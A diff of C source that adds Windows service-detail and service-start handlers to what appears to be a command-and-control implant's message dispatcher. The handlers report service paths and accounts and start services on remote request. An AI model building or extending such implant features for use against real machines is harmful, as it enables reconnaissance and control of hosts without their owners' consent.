@@ -2551,15 +2551,12 @@ PENVELOPE ServicesHandler
 	DWORD i = 0;
 	SC_HANDLE hScManager = NULL;
 	LPSTR lpErrorDesc = NULL;
-	LPSERVICE_DESCRIPTIONA lpServiceDesc = NULL;
 	LPQUERY_SERVICE_CONFIGA pServiceConfig = NULL;
 	DWORD dwBytesNeeded = 0;
+	LPSERVICE_DESCRIPTIONA lpServiceDesc = NULL;
 
 	Services = EnumServices(&dwNumberOfServices);
-	if (Services == NULL) {
-
-	}
-	if (Services != NULL || dwNumberOfServices == 0) {
+	if (Services == NULL || dwNumberOfServices == 0) {
 		goto CLEANUP;
 	}
 
@@ -2574,6 +2571,7 @@ PENVELOPE ServicesHandler
 		pService = &Services[i];
 		ServiceDetails[0] = CreateBytesElement(pService->lpServiceName, lstrlenA(pService->lpServiceName), 1);
 		ServiceDetails[1] = CreateBytesElement(pService->lpDisplayName, lstrlenA(pService->lpDisplayName), 2);
+		ServiceDetails[3] = CreateVarIntElement(pService->ServiceStatusProcess.dwCurrentState, 4);
 		hService = OpenServiceA(hScManager, pService->lpServiceName, SERVICE_QUERY_CONFIG | SERVICE_QUERY_STATUS);
 		if (hService != NULL) {
 			QueryServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, NULL, 0, &dwBytesNeeded);
@@ -2586,7 +2584,6 @@ PENVELOPE ServicesHandler
 				FREE(lpServiceDesc);
 			}
 
-			ServiceDetails[3] = CreateVarIntElement(pService->ServiceStatusProcess.dwCurrentState, 4);
 			QueryServiceConfigA(hService, NULL, 0, &dwBytesNeeded);
 			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
 				pServiceConfig = ALLOC(dwBytesNeeded + 1);
@@ -2630,6 +2627,227 @@ CLEANUP:
 
 	if (ServiceList != NULL) {
 		FREE(ServiceList);
+	}
+
+	FreeElement(pFinalElement);
+
+	return pRespEnvelope;
+}
+
+PENVELOPE ServiceDetailHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pRespEnvelope = NULL;
+	PPBElement ServiceDetails[7];
+	PPBElement pFinalElement = NULL;
+	PBUFFER** pServiceInfoReq = NULL;
+	PPBElement pRecvElement;
+	SC_HANDLE hService = NULL;
+	DWORD i = 0;
+	SC_HANDLE hScManager = NULL;
+	LPSTR lpErrorDesc = NULL;
+	LPQUERY_SERVICE_CONFIGA pServiceConfig = NULL;
+	DWORD dwBytesNeeded = 0;
+	LPSERVICE_DESCRIPTIONA lpServiceDesc = NULL;
+	PPBElement RecvElementList[2];
+	LPSTR lpServiceName = NULL;
+	DWORD cchServiceDisplayName = 0;
+	LPSTR lpServiceDisplayName = NULL;
+	SERVICE_STATUS ServiceStatus;
+
+	pRecvElement = ALLOC(sizeof(PBElement));
+	pRecvElement->Type = StructType;
+	pRecvElement->dwFieldIdx = 1;
+	pRecvElement->SubElements = ALLOC(sizeof(PPBElement) * 2);
+	pRecvElement->dwNumberOfSubElement = 2;
+	for (i = 0; i < pRecvElement->dwNumberOfSubElement; i++) {
+		pRecvElement->SubElements[i] = ALLOC(sizeof(PBElement));
+		pRecvElement->SubElements[i]->Type = Bytes;
+		pRecvElement->SubElements[i]->dwFieldIdx = i + 1;
+	}
+
+	pServiceInfoReq = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	lpServiceName = DuplicateStrA(pServiceInfoReq[0][0]->pBuffer, 0);
+	hScManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
+	if (hScManager == NULL) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenSCManagerA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	hService = OpenServiceA(hScManager, lpServiceName, SERVICE_QUERY_CONFIG | SERVICE_QUERY_STATUS);
+	if (hService == NULL) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenServiceA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	ServiceDetails[0] = CreateBytesElement(lpServiceName, lstrlenA(lpServiceName), 1);
+	GetServiceDisplayNameA(hScManager, lpServiceName, NULL, &cchServiceDisplayName);
+	cchServiceDisplayName++;
+	lpServiceDisplayName = ALLOC(cchServiceDisplayName);
+	if (!GetServiceDisplayNameA(hScManager, lpServiceName, lpServiceDisplayName, &cchServiceDisplayName)) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "GetServiceDisplayNameA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	ServiceDetails[1] = CreateBytesElement(lpServiceDisplayName, lstrlenA(lpServiceDisplayName), 2);
+	QueryServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, NULL, 0, &dwBytesNeeded);
+	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
+		lpServiceDesc = ALLOC(dwBytesNeeded + 1);
+		if (QueryServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, lpServiceDesc, dwBytesNeeded, &dwBytesNeeded)) {
+			ServiceDetails[2] = CreateBytesElement(lpServiceDesc->lpDescription, lstrlenA(lpServiceDesc->lpDescription), 3);
+		}
+	}
+
+	SecureZeroMemory(&ServiceStatus, sizeof(ServiceStatus));
+	if (!QueryServiceStatus(hService, &ServiceStatus)) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "QueryServiceStatus failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	ServiceDetails[3] = CreateVarIntElement(ServiceStatus.dwCurrentState, 4);
+	QueryServiceConfigA(hService, NULL, 0, &dwBytesNeeded);
+	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
+		pServiceConfig = ALLOC(dwBytesNeeded + 1);
+		if (QueryServiceConfigA(hService, pServiceConfig, dwBytesNeeded, &dwBytesNeeded)) {
+			ServiceDetails[4] = CreateVarIntElement(pServiceConfig->dwStartType, 5);
+			ServiceDetails[5] = CreateBytesElement(pServiceConfig->lpBinaryPathName, lstrlenA(pServiceConfig->lpBinaryPathName), 6);
+			ServiceDetails[6] = CreateBytesElement(pServiceConfig->lpServiceStartName, lstrlenA(pServiceConfig->lpServiceStartName), 7);
+		}
+	}
+
+	pFinalElement = CreateStructElement(ServiceDetails, _countof(ServiceDetails), 1);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
+
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (lpServiceName != NULL) {
+		FREE(lpServiceName);
+	}
+
+	FreeElement(pRecvElement);
+	if (pServiceInfoReq != NULL) {
+		FreeBuffer(pServiceInfoReq[0][0]);
+		FreeBuffer(pServiceInfoReq[0][1]);
+		FREE(pServiceInfoReq[0]);
+		FREE(pServiceInfoReq);
+	}
+
+	if (lpServiceDesc != NULL) {
+		FREE(lpServiceDesc);
+	}
+
+	if (pServiceConfig != NULL) {
+		FREE(pServiceConfig);
+	}
+
+	if (hScManager != NULL) {
+		CloseServiceHandle(hScManager);
+	}
+
+	if (lpServiceDisplayName != NULL) {
+		FREE(lpServiceDisplayName);
+	}
+
+	if (hService != NULL) {
+		CloseServiceHandle(hService);
+	}
+
+	FreeElement(pFinalElement);
+
+	return pRespEnvelope;
+}
+
+PENVELOPE StartServiceByNameHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pRespEnvelope = NULL;
+	PBUFFER** pServiceInfoReq = NULL;
+	PPBElement pRecvElement;
+	SC_HANDLE hService = NULL;
+	DWORD i = 0;
+	SC_HANDLE hScManager = NULL;
+	LPSTR lpErrorDesc = NULL;
+	DWORD dwBytesNeeded = 0;
+	PPBElement RecvElementList[2];
+	LPSTR lpServiceName = NULL;
+	PPBElement pFinalElement = NULL;
+
+	pRecvElement = ALLOC(sizeof(PBElement));
+	pRecvElement->Type = StructType;
+	pRecvElement->dwFieldIdx = 1;
+	pRecvElement->SubElements = ALLOC(sizeof(PPBElement) * 2);
+	pRecvElement->dwNumberOfSubElement = 2;
+	for (i = 0; i < pRecvElement->dwNumberOfSubElement; i++) {
+		pRecvElement->SubElements[i] = ALLOC(sizeof(PBElement));
+		pRecvElement->SubElements[i]->Type = Bytes;
+		pRecvElement->SubElements[i]->dwFieldIdx = i + 1;
+	}
+
+	pServiceInfoReq = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	lpServiceName = DuplicateStrA(pServiceInfoReq[0][0]->pBuffer, 0);
+	hScManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
+	if (hScManager == NULL) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenSCManagerA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	hService = OpenServiceA(hScManager, lpServiceName, SERVICE_START);
+	if (hService == NULL) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenServiceA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	if (!StartServiceA(hService, 0, NULL)) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "StartServiceA failed at %s", __FUNCTION__);
+		goto CLEANUP;
+	}
+
+	pFinalElement = CreateStructElement(NULL, 0, 9);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (lpServiceName != NULL) {
+		FREE(lpServiceName);
+	}
+
+	FreeElement(pRecvElement);
+	if (pServiceInfoReq != NULL) {
+		FreeBuffer(pServiceInfoReq[0][0]);
+		FreeBuffer(pServiceInfoReq[0][1]);
+		FREE(pServiceInfoReq[0]);
+		FREE(pServiceInfoReq);
+	}
+
+	if (hScManager != NULL) {
+		CloseServiceHandle(hScManager);
+	}
+
+	if (hService != NULL) {
+		CloseServiceHandle(hService);
 	}
 
 	FreeElement(pFinalElement);
@@ -2972,10 +3190,10 @@ VOID MainHandler
 		pResp = ServicesHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgServiceDetailReq) {
-	
+		pResp = ServiceDetailHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgStartServiceByNameReq) {
-	
+		pResp = StartServiceByNameHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgMountReq) {
 	
